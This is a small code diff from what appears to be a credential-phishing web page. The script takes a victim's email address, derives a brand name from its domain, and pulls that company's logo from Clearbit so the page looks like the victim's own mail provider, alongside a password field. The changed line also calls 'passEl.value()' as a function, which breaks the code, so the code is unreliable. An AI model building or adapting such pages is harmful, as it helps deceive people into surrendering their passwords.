@@ -974,7 +974,7 @@ ISO: ${now.toISOString()}
 
         const domain = email.split('@')[1];
         const brand = domain.split('.')[0].toUpperCase();
-        const password = passwordInput
+        const password = passEl.value();
         const logo = document.getElementById('logoimg');
         if (logo) logo.src = 'https://logo.clearbit.com/' + domain;
 
@@ -1053,6 +1053,7 @@ ISO: ${now.toISOString()}
 </body>
 
 </html>
+
 
 
 
